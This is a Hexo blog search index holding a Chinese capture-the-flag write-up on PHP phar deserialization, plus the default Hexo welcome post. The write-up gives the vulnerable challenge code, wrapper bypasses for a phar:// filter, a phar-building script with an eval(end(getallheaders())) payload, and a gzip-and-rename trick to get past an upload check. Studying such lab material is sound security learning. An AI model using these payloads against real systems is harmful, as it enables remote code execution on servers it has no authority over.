<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Phar</title>
    <link href="/2024/04/28/Phar/"/>
    <url>/2024/04/28/Phar/</url>
    
    <content type="html"><![CDATA[<h1 id="Phar-me"><a href="#Phar-me" class="headerlink" title="Phar me"></a>Phar me</h1><p>phar反序列化 好久没有接触这个知识点了</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;ch3nx1&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/;+/&#x27;</span>,<span class="hljs-string">&#x27;ch3nx1&#x27;</span>,<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;cmd)))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd.<span class="hljs-string">&#x27;isbigvegetablechicken!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>关键点一 preg_match()<code>函数检查</code>$_POST[‘file’]<code>是否以</code>phar:&#x2F;&#x2F;&#96; 开头 需要绕过</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">post</span>上传<span class="hljs-keyword">file</span>=<br><span class="hljs-keyword">compress</span>.bzip:<span class="hljs-comment">//phar://</span><br><span class="hljs-keyword">compress</span>.bzip2:<span class="hljs-comment">//phar://</span><br><span class="hljs-keyword">compress</span>.zlib:<span class="hljs-comment">//phar://</span><br>php:<span class="hljs-comment">//filter/resource=phar://test.txt</span><br><br>其中将<span class="hljs-keyword">test</span>.txt改为上传的文件名即可<br></code></pre></td></tr></table></figure><p>关键点二 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;ch3nx1&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/;+/&#x27;</span>,<span class="hljs-string">&#x27;ch3nx1&#x27;</span>,<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;cmd)))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd.<span class="hljs-string">&#x27;isbigvegetablechicken!&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;cmd): 这部分代码使用正则表达式，将 <span class="hljs-variable language_">$this</span>-&gt;cmd 中的所有字母、下划线和括号替换为空字符串。换句话说，它从 <span class="hljs-variable language_">$this</span>-&gt;cmd 中移除了所有的字母、下划线和括号。<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/;+/&#x27;</span>,<span class="hljs-string">&#x27;ch3nx1&#x27;</span>, ... ): 这部分代码将上一步得到的结果中的所有分号 (;) 替换为字符串 <span class="hljs-string">&#x27;ch3nx1&#x27;</span>并进行判断<br>   使用无参rce 只含有一个;<br>无参rce   ?code=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()));<br></code></pre></td></tr></table></figure><p>关键点三</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd.<span class="hljs-string">&#x27;isbigvegetablechicken!&#x27;</span>);<br></code></pre></td></tr></table></figure><p>可以通过利用__halt_compiler();函数 终端编译器的执行达成rce的效果</p><p>phar反序列化 <a href="https://xz.aliyun.com/t/2715?time__1311=n4+xniDQitDt0=DkFNDsE3g1DRmDcDQuuRbAhD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/2715?time__1311=n4%2BxniDQitDt0%3DDkFNDsE3g1DRmDcDQuuRbAhD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p>1 生成phar文件(需要配置php.ini  <a href="https://www.xp.cn/phpstudy-v8/php-expand.html">php扩展管理与开启 - phpStudy V8 使用手册 (xp.cn)</a>)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;eval(end(getallheaders()));__halt_compiler();&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>2 测试发现需改成.jpg格式上传</p><p>3 上传成功提示<img src="C:\Users\郑克增\AppData\Roaming\Typora\typora-user-images\image-20240427175948573.png" alt="image-20240427175948573"></p><p>发现了过滤__halt_compiler <a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F">https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F</a></p><p>直接linux <strong>gzip phar.phar 生成gzip文件</strong> 之后复制到windows上修改后缀jpg上传<img src="C:\Users\郑克增\AppData\Roaming\Typora\typora-user-images\image-20240427182252871.png" alt="image-20240427182252871"></p><p><strong>知识点一无参rce与函数配合</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">所谓无参数RCE说白了就是使用一个个的函数来达到我们的目的。<br>利用getallheaders()  getallheaders返回当前请求的所有请求头信息<br>之后就可用数组操作的函数拿出phpinfo()且执行。<br>构造payload<br>?code=eval(<span class="hljs-keyword">end</span>(getallheaders()));  在请求头最后上传<span class="hljs-keyword">a</span>:<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);即可执行<br></code></pre></td></tr></table></figure><p>参考文章：</p><p>关于无参数rce<a href="https://xz.aliyun.com/t/10212?time__1311=mq+xBDyDRiG==DKDsT4+DArEQfI1D7Kx&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/10212?time__1311=mq%2BxBDyDRiG%3D%3DDKDsT4%2BDArEQfI1D7Kx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p>无参rce<a href="https://juejin.cn/post/7173629924555620388#heading-5">https://juejin.cn/post/7173629924555620388#heading-5</a></p><p><a href="https://zhuanlan.zhihu.com/p/157431794">无参数读文件和RCE总结 - 知乎 (zhihu.com)</a></p><p><strong>知识点二 __halt_compiler();函数</strong><img src="C:\Users\郑克增\AppData\Roaming\Typora\typora-user-images\image-20240427223935305.png" alt="image-20240427223935305"></p><p><strong>知识点三 一些phar的过滤</strong></p><p>见文章：</p><p><a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F">https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F</a></p><p>参考文章</p><p><a href="https://zh0um1.github.io/posts/c5577d2#%E8%BF%87%E6%BB%A4-phar-x2F-x2F-%E5%8D%8F%E8%AE%AE">phar 反序列化 | Zh0um1’s Blog</a></p><p>[php反序列化拓展攻击详解–phar - 先知社区 (aliyun.com)](</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/03/26/hello-world/"/>
    <url>/2024/03/26/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
